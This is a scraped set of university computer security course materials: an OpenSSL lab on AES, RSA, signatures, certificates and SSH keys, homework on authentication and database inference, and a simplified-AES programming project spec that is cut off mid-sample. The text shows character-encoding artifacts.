INTRO TO COMPUTER SECURITY,5550,Cryptography 5,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab Lab 5a: Cryptography In this lab, you will be using the Ubuntu 20 VM. The credentials are: Username: sec-lab Password: untccdc NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g. â€œWho is the owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction The learning objective of this lab is for students to get some hands-on experience with the basic cryptographic primitives: symmetric encryption, public-key encryption, and digital signatures. Also, they will get familiar with two popular applications: public-key certificates, and SSH authentication. This lab is mainly based on OpenSSL (https://www.openssl.org/)â€”a toolkit for the Transport Layer Security (TLS) protocol, and also a general-purpose cryptographic library. Its full-featured version OpenSSL 1.1.1 is installed on the VM. Section 1: Symmetric Encryption using OpenSSL In this section, let us work with the AES cipher (symmetric encryption algorithm). In OpenSSL, encryption and decryption is performed using â€œopenssl encâ€ and â€œopenssl decâ€ commands, respectively. You may type â€œman opensslâ€ to learn more. 1. In your home directory, create a text file plaintext.txt and write a sentence â€œThis is my secret messageâ€ into it (make sure to close the file). To confirm, type: cat plaintext.txt Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab Q1: Attach a screenshot of the result. 2. Let us now encrypt this file using a password. Read the below explanation first, and then type: openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.bin The first option requests to use the AES-256 cipher in the counter (CTR) mode. The second option defined a password to be used for encryption, and the next option requests to use the PBKDF2 algorithm for generating a key from the password. In this exercise, for simplicity, use your EUID as a password (for example, if your EUID is â€œaa0001â€, then the respective option will be written as â€œ-pass pass:aa0001â€). Note that in practice, such a password should never be used as it is very weak (i.e., too short and too easy to guess). The remaining options define the filenames for input (the plaintext) and output (the ciphertext). Note: If the â€œ-passâ€ option was not used, then utility would request the password to be entered manually (two times â€“ the second one for confirmation). 3. Display the contents of the ciphertext file: hexdump -C ciphertext.bin Q2: Attach a screenshot of the result. 4. For decryption: openssl enc -aes-256-ctr -pass pass:euid -pbkdf2 -d -in ciphertext.bin -out plaintext_dec.txt Note: If the â€œ-passâ€ option was not used, then the utility would request the password to be entered manually. 5. To confirm, type: cat plaintext_dec.txt Note that the original message has been decrypted. Q3: Attach a screenshot of the result. 6. It is possible to encode the ciphertext using Base64, in order to have it in the text format: openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext.txt 7. Type: cat ciphertext.txt 8. Verify that decryption works correctly: Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext.txt -out plaintext_dec2.txt Note: If the option â€œ-outâ€ is omitted, the standard output is used. Q4: Attach a screenshot of the result. 9. Run the encryption again with the same password, but write the output into ciphertext2.txt: openssl enc -aes-256-ctr -a -pass pass:euid -pbkdf2 -in plaintext.txt -out ciphertext2.txt 10. Note that the decryption works correctly again: openssl enc -aes-256-ctr -d -a -pass pass:euid -pbkdf2 -in ciphertext2.txt 11. Now, note that the ciphertexts are different. To verify, type: cat ciphertext.txt ciphertext2.txt Q5: Explain why the ciphertexts in ciphertext.txt and ciphertext2.txt are different, even though the same password was used for encryption. Hint: Run decryption of both files again, but now add the â€œ-pâ€ option to the original command. Section 2: Public Key Encryption and Digital Signatures Using OpenSSL Let us focus on the RSA algorithm in this section. 1. First, let us generate an RSA private key (effectively, we will generate the public/private key pair). Type: openssl genrsa -out euid.key 3072 As usual, replace â€œeuidâ€ with your actual EUID. This command generates the RSA private key and outputs it to the file euid.key. The key is stored in the PEM format. Display it: cat euid.key 2. Next, we extract and display the public key: openssl rsa -in euid.key -pubout -out euid_pk.key cat euid_pk.key Q6: Attach a screenshot of the result. What security level does 3072-bit RSA key offer? Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab 3. For encrypting the plaintext.txt, type: openssl rsautl -encrypt -pubin -inkey euid_pk.key -in plaintext.txt -out rsa_ciphertext.bin 4. For decryption, type: openssl rsautl -decrypt -inkey euid.key -in rsa_ciphertext.bin -out rsa_plaintext_dec.txt cat rsa_plaintext_dec.txt Q7: Attach a screenshot of the result. Note: The above method is suitable for encryption of short messages (up to about 1 kilobyte), for longer messages a hybrid encryption (KEM/DEM) should be used. 5. To digitally sign the file plaintext.txt, type: openssl dgst -sign euid.key -out sig.bin plaintext.txt Note: As of version 1.1.1, OpenSSL signs messages directly when using the rsautl or pkeyutl commands. For this reason, it is simpler to deploy the dgst command, in order to hash and sign the message with one command. Display the signature: hexdump sig.bin 6. To verify the signature: openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt Q8: Attach a screenshot of the result. 7. Any changes in the message will invalidate the signature. Let us replace the last letter in our message: echo ""That is my secret message"" > plaintext.txt cat plaintext.txt 8. Now, verification will fail: openssl dgst -verify euid_pk.key -signature sig.bin plaintext.txt Q9: Attach a screenshot of the result. Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab Section 3: Public Key Certificates Using OpenSSL Let us now study handling of X.509 public key certificates using OpenSSL. Suppose that we would like to create a certificate signing request (CSR) to the Certificate Authority for the RSA key, which we generated earlier. The following command can be used (do not type it yet): openssl req -key euid.key -new -out euid_domain.csr Then, the utility will request some additional information, which is called a Distinguished Name (DN). An important field in the DN is the Common Name (CN) â€”it should be the exact domain name of the host for which the certificate will be used. Below is an example of the prompt: Country Name (2 letter code): The two-letter country code where your company/organization is legally located. Example: US State or Province Name (full name): Example: Texas Locality Name (e.g., city): Example: Denton Organization Name (e.g., company): University of North Texas Organizational Unit Name (e.g., section): Department of Computer Science and Engineering (this field is optional) Common Name (e.g. server FQDN): Fully Qualified Domain Name; Example: www.unt.edu Email Address: Example: webmaster@unt.edu (this field is optional) It is possible to enter all of the above information from the command line as described below. 1. Type: openssl req -key euid.key -new -out euid_domain.csr \ -subj ""/C=US/ST=Texas/L=Denton/O=UNT/OU=CSE/CN=www.euid.edu"" 2. Let us verify the result: openssl req -text -in euid_domain.csr -noout -verify Q10: Attach a screenshot of the result. Note: The CSR file â€œeuid_domain.csrâ€ will need to be sent to CA that will check the user information. If the check is successful, CA will issue the certificate file. We will omit this step in this lab. Instead, we will obtain and verify the certificate of the Google webserver. For that, we will use the s_client program (of the OpenSSL suite) which implements a generic SSL/TLS client. 3. Type: openssl s_client -connect google.com:443 </dev/null Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab Note: The redirection from the null device immediately closes the s_client program, as in general it expects commands to establish the TLS connection. 4. In order to display the whole certificate chain, type: openssl s_client -connect google.com:443 -showcerts </dev/null 5. Since the output of the previous command takes several screens to be display, making a picture of the last screen may not be very informative. The â€œmoreâ€ command will be helpful in this case. Type: openssl s_client -connect google.com:443 -showcerts </dev/null | more Note: Scrolling is done by pressing â€œSpaceâ€ to advance the whole screen down, or â€œEnterâ€ to advance one line. Q11: Attach two screenshots: The first and the last screen displayed as a result of the above command. Section 4: SSH Authentication Using Public Keys OpenSSH can use public key cryptography for authentication. We will use a freshly generated RSA key pair. (Remark: We could have also used the RSA key from the previous steps, but we will not do it in this lab.) 1. Type: ssh-keygen -t rsa Note: You will see the following promptsâ€”you may just press â€œEnterâ€ for all of themâ€”and the following messages will be displayed: Enter file in which to save the key (/home/sec-lab/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/sec-lab/.ssh/id_rsa Your public key has been saved in /home/sec-lab/.ssh/id_rsa.pub The key fingerprint is: SHA256:lsfwRd7HQmfPZ+rjQOGjLkyr+M67/xImKZRtVD31T9s sec-lab@vm1 (Note: The above value and the below â€œrandomartâ€ image will be different each time for each student. The randomart image is a visualization of the SHA256 hash value to make it easier to compare.) Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab The key's randomart image is: +---[RSA 3072]----+ | ... .o . o| | . oo + =.| | + . .+ + O| | o o = o . B+| | . . .S + + ..E| | . o.+. o o | | . = o. . o | | o =. o . | | .oB=.+o . | +----[SHA256]-----+ Note: In practice, the passphrase should be chosen as a secure password in order to restrict usage of the private key. In this lab, we use an empty password for simplicity. Q12: Attach a screenshot of the result. 2. Let us verify the result: ls ~/.ssh/ You may expect to see two files: id_rsa and id_rsa.pub, which should contain the private and public keys, respectively. 3. Let us try to establish an SSH connection (for simplicity, we will connect to our own host): ssh localhost The SSH server will request a password. Press â€œControl+Zâ€ to escape. Suppose that we want to allow trusted users to access our host without entering a password. Such a user needs to possess a private key corresponding to the public key communicated to the server in a trusted manner. Such the public keys are called â€œauthorized keysâ€. 4. Designate your public key as the OpenSSH authorized key as follows: cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys 5. This should allow us to establish an SSH connection (to our own host) without the use of passwords: ssh localhost // if the prompt about adding to the known hosts appears, then accept it (If successful, a welcome message will be displayed.) Student Name: Course: CSCE 5550 Semester: Fall 2022 Cryptography Lab Close the SSH connection: exit Q13: Attach a screenshot of the result. References: 1. OpenSSL version 1.1.1 manual: https://www.openssl.org/docs/man1.1.1/ 2. OpenSSL Cookbook, 3ed online: https://www.feistyduck.com/library/openssl-cookbook/online/ 3. OpenSSL Quick Reference Guide: https://www.digicert.com/kb/ssl-support/openssl-quick-reference-guide.htm 4. M. Anicas: OpenSSL Essentials: Working with SSL Certificates, Private Keys and CSRs: https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-sslcertificates-private-keys-and-csrs 5. Wikibook on OpenSSH/Cookbook/Public Key Authentication: https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Public_Key_Authentication"
INTRO TO COMPUTER SECURITY,3550,Data Security,"Homework 4 Due: 11:59 PM on Wednesday, March 30, 2022 Form of submission: PDF, Word, or Text Document in Canvas (8 points) List three reasons people might be reluctant to use biometrics for authentication. Can you think of ways to counter those objections? (12 points) ""Magnetic swipe"" (or magnetic strip) credit cards are activated by swiping it through a device that can read the data in the stripe. Credit card skimming (i.e., credit card fraud) can be achieved by fitting a small, illegal device on top of real card readers at self-service sale terminals. Briefly describe two ways that can make credit cards more secure. Identify two reasons why have banks not made them even more secure? (8 points) False-positive and false-negative rates can be adjusted, and they are often complementary: lowering one raises the other. List two situations/scenarios in which false negatives are significantly more serious than false positives. (8 points) In a typical office, biometric authentication might be used to control access to employees and registered visitors only. We know the system will have some false negatives, some employees falsely denied access, so we need a human override, someone who can examine the employee and allow access in spite of the failed authentication. Thus, we need a human guard at the door to handle problems as well as the authentication device; without biometrics, we would have had just the guard. Consequently, we have the same number of personnel with or without biometrics, plus we have the added cost to acquire and maintain the biometrics system. Explain the security advantage in this situation that justifies the extra expense. (8 points) If you forget your password for a website and you click [Forgot my password], sometimes the company sends you a new password by email, but sometimes it sends you your old password by email. Compare these two cases in terms of vulnerability of the website owner. (12 points) Humans are said to be the weakest link in any security system. Give an example for each of the following: (a) A situation in which human failure could lead to a compromise of encrypted data (b) A situation in which human failure could lead to a compromise of identification and authentication (c) A situation in which human failure could lead to a compromise of access control (12 points) Password Managers What is a password manager and why is it useful? What security risks are associated with password managers? (8 points) File access control relates largely to the secrecy dimension of confidentiality. What is the relationship between an access control matrix and the integrity of the objects to which access is being controlled? (12 points) Suppose you manage a web site that stores a database of usernames and passwords. Valid passwords contain only letters a â€“ z, A â€“ Z, and digits 0 â€“ 9, and are exactly 8 characters long. You incorporated some basic defenses by storing SHA-256 hashes instead of the plaintext passwords, but unfortunately, an attacker stole the database. Assuming the attacker is able to process 4 million SHA-256 passwords per second, how many hours on average would it take for the attacker to crack a single password by brute force? (12 points) We have seen that online password guessing attacks are detectable (e.g., your bank may shut down online access to your account after n failed login attempts). Given that web sites (i.e., applications) have many components and vulnerabilities can be found on the client side, server side, as well as the communication channel, describe two ways that an attacker may circumvent this lockout? Be creative, but specific."
INTRO TO COMPUTER SECURITY,3550,Database Security,"Homework 7 Due: 11:59 PM on Thursday, April 28, 2022 Form of submission: PDF, Word, or Text Document in Canvas â¦ Consider the following questions regarding the data aggregation: â¦ Describe a situation in which the sensitivity of an aggregate is greater than that of its constituent values. â¦ Describe a situation in which the sensitivity of an aggregate is less than that of its constituent values. â¦ One approach suggested to ensure privacy is the small result rejection, in which the system rejects any query whose result returns a small number (e.g., where n = 5, for example). Describe the process how an attacker might be able to obtain sensitive data by using only queries derived from six records. â¦ The response to a query â€œsensitive value; response suppressedâ€ is itself a disclosure. One possible measure to suppress responses that reveal sensitive information without disclosing that the responses to certain queries are sensitive is to use random data suppression, where the database management system periodically suppresses the response to a particular query that was not sensitive. In this case, the user would not know if it was because of random suppression or sensitive data. Describe how this approach might fail. â¦ Suppose that you create a new privacy-conscious social network called PrivateFriends whose data consists of a dataset called Users that contains a record with the ID, name, age, interests (i.e., things a user likes), and list of friends. Friendships on PrivateFriends are two-way, meaning that if user A is friends with user B, then user B is friends with user A. The ages of all the users are between 0 (yes, infants want private friends in this day and age) and 80, inclusively, and each user can only have up to 50 friends, inclusively. If a user is removed from the network, then that user no longer appears in any list of friends. Of course, you are concerned about the differential privacy as your advertisers make queries on your Users dataset. Suppose that we define the sensitivity of a function on datasets and as , where the maximum is over all pairs of sets in and that differ in at most one element. Recall that and can only differentiate by at most one row, when a user is added or removed. For each of the queries listed below on Users, compute the sensitivity . If the sensitivity is not bounded by a constant given in the problem, write ""not bounded"". â¦ â¦ â¦ â¦ â¦ Consider the following database table: A normal user may not query the database on the field Name and may only use formulas such as , , , , , and . The database is protected with the query size restriction technique for each operation (e.g., , , etc.) with , in that no individual query operation that matches fewer than or more than will be answered, where is the size of the database table. This means that a query operation resulting in 1 record or more than 11 (i.e., ) will be rejected. Formulate your query in the following format: â¦ is the characteristic formula, such as . â¦ is a specific attribute, such as . Then, using the values above, the query is acceptable since it is based on two entries. Since , the query with where and would be rejected since the result is based on one match. â¦ Use a query with exactly two query operations and demonstrate how the tracker attack could be used to find the exact salary of Professor Dodd assuming that the attacker knew that Professor Dodd is the only female CS professor. This is the only external information that the attacker has, and you cannot make any other assumptions about the values in the database. This means that you should have two characteristic formulas, and , and one attribute, , expressed something like , for example. â¦ BONUS: Now assume that the database consists solely of the six entries from the CS department, such that . Rewrite your query from (a) above so that it does not violate the query size restriction technique for , meaning that all query operations should have between 2 and 4 results, inclusively. Note that if your answer to (a) above satisfies this requirement, simply rewrite it here again so that the graders will know to give credit for the bonus. â¦ Suppose that a telephone company maintains records on every telephone call it handled, showing the calling phone number, the called phone number, and the time, date, and duration of the call. â¦ What uses might the telephone company make of those records? â¦ What uses might commercial marketers make of those records? â¦ What uses might a rival telephone company make of those records? â¦ What uses might a government make of those records? â¦ Which of those uses violates individualsâ€™ privacy rights?"
INTRO TO COMPUTER SECURITY,3550,Encryption System Development,"CSCE 3550 Foundations of Cybersecurity Spring 2022 1 Project 3 Due: 11:59 PM on Tuesday, May 3, 2022 For Project 3, you will implement an encryption system in any programming language supported on our Linux CSE machines using a modified, simplified version of AES (Advanced Encryption System) on our CSE machines that will (1) read the plain text from a file and a key from another file; (2) encrypt the plain text according to the requirements detailed below; and (3) write the output for each step to the screen and to an output file. Your source code must be sufficiently commented to explain your program. At a minimum, you should comment the header (e.g., name, class date, brief description of the program), all variables (i.e., what each variable is used for), and specific â€œblocksâ€ of code. This applies to all user-defined functions as well. For example, use comments to describe the inputs, the formulas used, and any other important steps in your code. Be sure to handle any applicable error conditions in your code (e.g., if there is a problem opening the file, etc.). 1. Input Files Your program will prompt the user to enter the name of the input file containing the plain text that will be encrypted (i.e., the plaintext input file) as well as the name of the input file containing the key that will be used in the encryption process (i.e., the key input file). The input file containing the plain text will consist solely of uppercase letters (e.g., A â€“ Z), punctuation, and whitespace characters. Lines will not be longer than 80 characters, but the number of lines in the file is not known. â€¢ Example plain text in an input file: ENCRYPT THIS MESSAGE USING THE ALGORITHM DESCRIBED BELOW. The file containing the key will contain the key consisting of exactly 16 uppercase letters given in a single line. â€¢ Example of a key in a key file: SIMPLEEXAMPLEKEY 2. Output File Your program will prompt the user to enter the name of the output file containing the output of each step of the encryption algorithm. Your program will write the output of each step of the encryption algorithm in the output file. First, write the name of the step on a separate line, and then write the output of that particular step. If the output in a particular step is manipulate as blocks of 4 Ã— 4, then it should appear as blocks of 4 Ã— 4 in the output file. Make sure that immediately after each step, you write the data in the output file and save the file. If you do not do this and your program crashes, then there will be no output produced, so partial credit will be limited. CSCE 3550 Foundations of Cybersecurity Spring 2022 2 3. Encryption Algorithm The encryption algorithm shall consist of two parts: (1) substitution, and (2) encryption on blocks of size 4 Ã— 4 characters. The detailed description of the steps is as follows: a) Preprocessing Remove any punctuation and whitespace characters from the input. o Example: Input Text: ENCRYPT THIS MESSAGE USING THE ALGORITHM DESCRIBED BELOW. Output Text: ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW b) Substitution Perform a polyalphabetic substitution using the VigenÃ¨re cipher on the input file with the key provided in the key input file. o Example: Key: SIMPLEEXAMPLEKEY Input Text: ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW Output Text: WVOGJTXQHUHXICWYYMGHTRKQHQPWKYVGLPYSPWGOINTOFOPMO c) Padding Steps d) â€“ f) are performed on blocks of size 4 x 4 characters formed from the output of step b (i.e., substitution). They are parts of AES and as in any block cipher, the input has to be padded. In this particular case, pad the output from the previous step with Aâ€™s so that the length of the message is divisible by 16. o Example: Input: Output: WVOG WVOG JTXQ JTXQ HUHX HUHX ICWY ICWY YMGH YMGH TRKQ TRKQ HQPW HQPW KYVG KYVG LPYS LPYS PWGO PWGO INTO INTO FOPM FOPM O OAAA AAAA AAAA AAAA CSCE 3550 Foundations of Cybersecurity Spring 2022 3 d) ShiftRows This step is the same as the ShiftRows step in the AES encryption. Circularly shift the rows in each block in the following fashion: The first row remains the same. Shift the second row one position to the left. Shift the third row two positions to the left. Finally, shift the fourth row three positions to the left. o Example: Input: Output: WVOG WVOG JTXQ TXQJ HUHX HXHU ICWY YICW YMGH YMGH TRKQ RKQT HQPW PWHQ KYVG GKYV LPYS LPYS PWGO WGOP INTO TOIN FOPM MFOP OAAA OAAA AAAA AAAA AAAA AAAA AAAA AAAA e) Parity Bit Convert each character to its numeric value (0 â€“ 127) and use the most significant bit as a parity bit. o Example: The numeric value of â€˜Aâ€™ is 65!"" = 01000001# = 41!$. There is an even number of ones in its binary representation, so the most significant bit stays unchanged. However, the numeric representation of â€˜Câ€™ is 67!"" = 01000011#. In this case, since there is and odd number of ones (i.e., three) in the binary representation, the most significant bit will be set to one in order to have an even number of ones in the binary representation, i.e., â€˜Câ€™ with added parity will be 11000011# = 195!"" = c3!$. Input: Output (in hexadecimal): WVOG d7 56 cf 47 TXQJ d4 d8 d1 ca HXHU 48 d8 48 55 YICW 59 c9 c3 d7 YMGH 59 4d 47 48 RKQT d2 4b d1 d4 PWHQ 50 d7 48 d1 GKYV 47 4b 59 56 LPYS cc 50 59 53 WGOP d7 47 cf 50 CSCE 3550 Foundations of Cybersecurity Spring 2022 4 TOIN d4 cf c9 4e MFOP 4d c6 cf 50 OAAA cf 41 41 41 AAAA 41 41 41 41 AAAA 41 41 41 41 AAAA 41 41 41 41 f) MixColumns This step diffuses the data and is the same as the MixColumns step in the AES encryption. The transformation is performed by multiplying the circulant MDS matrix with each column from the input (i.e., the output of step e) as shown below. This transformation is repeated for each block. , 2 3 1 2 1 1 3 1 1 1 3 1 2 3 1 2 . Ã— , ï¿½"" ï¿½! ï¿½# ï¿½% . = , ï¿½"" ï¿½! ï¿½# ï¿½% . However, instead of simple multiplication, it uses multiplication in the Rijndaelâ€™s Galois field. But this is not as difficult as it sounds since this transformation matrix only contains the numbers 1, 2, and 3. Therefore, you will only multiply with 1, 2, and 3. o Example: Letâ€™s assume that you want to multiply the eight bit number ï¿½ = 10101111# with 2!"" = 00000010# and 3!"" = 00000011# in Rijndaelâ€™s Galois field. The multiplication would be done in the following manner: Multiplication with 2: ï¿½ Ã— 2 = 10101111 â‰ª 1 = 01011110, where â‰ª is left shift and â€˜1â€™ is the number of places to be shifted. This is the easiest way to multiply a number by 2. Notice that the most significant bit (MSB) of x, which is 1, is dropped. Because the MSB of x is 1 the result has to be XORed with 00011011. Then, 01011110 âŠ• 00011011 = 01000101. Multiplication with 3: Since 3 can be represented as a sum of 2 and 1, the multiplication is performed as ï¿½ Ã— 3 = ï¿½ Ã— (2 + 1) = ï¿½ Ã— 2 + ï¿½. However, in Rijndaelâ€™s Galois field, addition is done with the XOR operation, so the multiplication would be ï¿½ Ã— 3 = ï¿½ Ã— 2 â¨ ï¿½. So ï¿½ Ã— 3 = ï¿½ Ã— 2 â¨ ï¿½ = 10101111 â‰ª 1 âŠ• 10101111 = 01011110 âŠ• 10101111 = 11110001. Again, if the highest bit of x is zero, then we are done. Otherwise, the result has to be XORed with 00011011 as before. In this case, since the MSB bit of x is 1, the final result is 11110001 âŠ• 00011011 = 11101010. A suggestion would be to implement a function that performs multiplication on an eight bit binary representation of a number x with y (that can take a value of 2 or 3) as in rgfMul(x, y). In Rijndaelâ€™s Galois field, addition is performed using the XOR operation âŠ•. Therefore, the matrix multiplication in Rijndaelâ€™s Galois field becomes: CSCE 3550 Foundations of Cybersecurity Spring 2022 5 rgfMul(c0,2) âŠ• rgfMul(c1,3) âŠ• c2 âŠ• c3 = a0 c0 âŠ• rgfMul(c1,2) âŠ• rgfMul(c2,3) âŠ• c3 = a1 c0 âŠ• c1 âŠ• rgfMul(c2,2) âŠ• rgfMul(c3,3) = a2 rgfMul(c0,3) âŠ• c1 âŠ• c2 âŠ• rgfMul(c3,2) = a3 o Example: Letâ€™s take a look at how the first mix columns transformation is done using the first four entries in the first input column (in blue input) where ï¿½"" = d7, ï¿½! = d4, ï¿½# = 48, and ï¿½% = 59. We then perform the mix columns transformation as such for the first four entries in the output column (in green output): , 2 3 1 2 1 1 3 1 1 1 3 1 2 3 1 2 . Ã— , d7 d4 48 59 . = , c3 e5 78 4c . We break this out to see exactly how we obtain the value c3 in the output, which is made up of (2 Ã— ï¿½7) + (3 Ã— ï¿½4) + (1 Ã— 48 ) + (1 Ã— 59) (in red above). 2 Ã— ï¿½7 = 11010111 â‰ª 1 = 10101110 âŠ• 00011011 = 10110101 3 Ã— ï¿½4 = (11010100 â‰ª 1) + 11010100 = 10101000 âŠ• 11010100 = 01111100 âŠ• 00011011 = 01100111 1 Ã— 48 = 01001000 1 Ã— 59 = 01011001 We can simply XOR all of these values together: 10110101 â† 2 Ã— ï¿½7 âŠ• 01100111 â† 3 Ã— ï¿½4 11010010 âŠ• 01001000 â† 1 Ã— 48 10011010 âŠ• 01011001 â† 1 Ã— 59 11000011 = ï¿½3 Input: Output (in hexadecimal): d7 56 cf 47 c3 ce 66 49 d4 d8 d1 ca e5 47 6d e0 48 d8 48 55 78 65 d0 45 59 c9 c3 d7 4c 73 4e e3 59 4d 47 48 c8 db f7 70 d2 4b d1 d4 51 f2 7f c5 50 d7 48 d1 e2 6e ed df 47 4b 59 56 e7 dd e2 71 cc 50 59 53 78 60 fe 48 d7 47 cf 50 53 52 53 71 d4 cf c9 4e 7f c3 55 6f 4d c6 cf 50 d6 ef 68 4b cf 41 41 41 46 41 41 41 41 41 41 41 cf 41 41 41 41 41 41 41 cf 41 41 41 41 41 41 41 c8 41 41 41 CSCE 3550 Foundations of Cybersecurity Spring 2022 6 4. References Although this encryption is a modified, simplified version of AES, you may refer to the Lecture Notes posted on Canvas or the following for background information on AES: http://en.wikipedia.org/wiki/Advanced_Encryption_Standard 5. Testing Test your program to verify that it operates as desired with a variety of input files. Compare the answers your code gives with the ones you get from hand-calculations. Sample input and output appears below (with input shown in bold green): SAMPLE OUTPUT #1 $ more input1.txt ENCRYPT THIS MESSAGE USING THE ALGORITHM DESCRIBED BELOW. $ more key1.txt SIMPLEEXAMPLEKEY $ ./a.out Enter the name of the input plaintext file: input1.txt Enter the name of the input key file: key1.txt Enter the name of the output ciphertext file: output1.txt Preprocessing: ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW Substitution: WVOGJTXQHUHXICWYYMGHTRKQHQPWKYVGLPYSPWGOINTOFOPMO Padding: WVOG JTXQ HUHX ICWY YMGH TRKQ HQPW KYVG LPYS PWGO INTO FOPM OAAA AAAA AAAA AAAA ShiftRows: WVOG TXQJ HXHU YICW CSCE 3550 Foundations of Cybersecurity Spring 2022 7 YMGH RKQT PWHQ GKYV LPYS WGOP TOIN MFOP OAAA AAAA AAAA AAAA Parity Bit: d7 56 cf 47 d4 d8 d1 ca 48 d8 48 55 59 c9 c3 d7 59 4d 47 48 d2 4b d1 d4 50 d7 48 d1 47 4b 59 56 cc 50 59 53 d7 47 cf 50 d4 cf c9 4e 4d c6 cf 50 cf 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 MixColumns: c3 ce 66 49 e5 47 6d e0 78 65 d0 45 4c 73 4e e3 c8 db f7 70 51 f2 7f c5 e2 6e ed df e7 dd e2 71 78 60 fe 48 53 52 53 71 7f c3 55 6f d6 ef 68 4b 46 41 41 41 cf 41 41 41 cf 41 41 41 c8 41 41 41 $ more output1.txt Preprocessing: ENCRYPTTHISMESSAGEUSINGTHEALGORITHMDESCRIBEDBELOW Substitution: WVOGJTXQHUHXICWYYMGHTRKQHQPWKYVGLPYSPWGOINTOFOPMO CSCE 3550 Foundations of Cybersecurity Spring 2022 8 Padding: WVOG JTXQ HUHX ICWY YMGH TRKQ HQPW KYVG LPYS PWGO INTO FOPM OAAA AAAA AAAA AAAA ShiftRows: WVOG TXQJ HXHU YICW YMGH RKQT PWHQ GKYV LPYS WGOP TOIN MFOP OAAA AAAA AAAA AAAA Parity Bit: d7 56 cf 47 d4 d8 d1 ca 48 d8 48 55 59 c9 c3 d7 59 4d 47 48 d2 4b d1 d4 50 d7 48 d1 47 4b 59 56 cc 50 59 53 d7 47 cf 50 d4 cf c9 4e 4d c6 cf 50 cf 41 41 41 CSCE 3550 Foundations of Cybersecurity Spring 2022 9 41 41 41 41 41 41 41 41 41 41 41 41 MixColumns: c3 ce 66 49 e5 47 6d e0 78 65 d0 45 4c 73 4e e3 c8 db f7 70 51 f2 7f c5 e2 6e ed df e7 dd e2 71 78 60 fe 48 53 52 53 71 7f c3 55 6f d6 ef 68 4b 46 41 41 41 cf 41 41 41 cf 41 41 41 c8 41 41 41 SAMPLE OUTPUT #2 $ more input2.txt MRS. DALLOWAY SAID SHE WOULD BUY THE FLOWERS HERSELF. FOR LUCY HAD HER WORK CUT OUT FOR HER. THE DOORS WOULD BE TAKEN OFF THEIR HINGES; RUMPELMAYER'S MEN WERE COMING. AND THEN, THOUGHT CLARISSA DALLOWAY, WHAT A MORNING - FRESH AS IF ISSUED TO CHILDREN ON A BEACH. WHAT A LARK! WHAT A PLUNGE! FOR SO IT HAD ALWAYS SEEMED TO HER, WHEN, WITH A LITTLE SQUEAK OF THE HINGES, WHICH SHE COULD HEAR NOW, SHE HAD BURST OPEN THE FRENCH WINDOWS AND PLUNGED AT BOURTON INTO THE OPEN AIR. HOW FRESH, HOW CALM, STILLER THAN THIS OF COURSE, THE AIR WAS IN THE EARLY MORNING; LIKE THE FLAP OF A WAVE; THE KISS OF A WAVE; CHILL AND SHARP AND YET (FOR A GIRL OF EIGHTEEN AS SHE THEN WAS) SOLEMN, FEELING AS SHE DID, STANDING THERE AT THE OPEN WINDOW, THAT SOMETHING AWFUL WAS ABOUT TO HAPPEN; LOOKING AT THE FLOWERS, AT THE TREES WITH THE SMOKE WINDING OFF THEM AND THE ROOKS RISING, FALLING; STANDING AND LOOKING UNTIL PETER WALSH SAID,""MUSING AMONG THE VEGETABLES?""- WAS THAT IT?-""I PREFER MEN TO CAULIFLOWERS""- WAS THAT IT? $ more key2.txt VIRGINIAWOOLFMRS $ ./a.out Enter the name of the input plaintext file: input2.txt Enter the name of the input key file: key2.txt Enter the name of the output ciphertext file: output2.txt Preprocessingubstitution: CSCE 3550 Foundations of Cybersecurity Spring 2022 10 HZJJIYTOSOMDFUUKCMNUCYLBQMHSJRCGRMIYPRZSAZTQTDCMXGYGLUMRSCFVHGKGPBWUZUMRPVSOTAI KRWLRLOMTWYSYTRWLCMZXPVVGAGFFRBVDHIPKZFUEJKSCJOFEDVXGVQBHABHSTGXZOKCGZVASWROWQA NSTEYGBNUONBWYLRIWNPRYQSQSOISOYATZDTUXMAWNWPSLHTNZVBRRIESWDOHLUXLFBMWUZFWIPVOOF XNSTAJKMZMDPCVPWIYWIEZZPNTIPHZPXCLWVSFLBUMHEBUPXIYAXPJNMPWUHRVPFDEGRAYKPNLBQFGE TBVFOPVLZRVCDKWYIANKVVUVTHVGAROEGALJOWEOVGWTDSCAJZRAMPFCNEMSDVCHHMCENBZRTRZTDOB EMUJGAKFAZFMTDSOTWIRKDVKNMRIRHMAZWZZFBTZQMGPEBZOATRROVDVZPRSIOGCQFIRNZKYOTYINZG VLWBRFYGVZNBZACWFWTRVABPKKMAISOVSEMQEOVAJUTRUNBSSWNZXSNAYKLVLSPOBONZXLCMIKIGBHA CDPSIZFYWNZPNBSKASEMUEYVEWATJISWPCFYFFZVXGKVYWOGWBRFFKZZNCUERZSWHHSJFIWZANOBUBH AGAZPQNAILZTOBNFPVSXFZULCMIUWXAREGWYLRRDGQEMAGINZWBRFZUDJWBOVTCNPWZAJFVJRICYPFI IZAIDNZXSHWEMBUMVAUSEFNCWNERYBUITEHWAWQWWMUVTBBKAQZWQQANWMANGAGPAPWH Padding: HZJJ IYTO SOMD FUUK CMNU CYLB QMHS JRCG 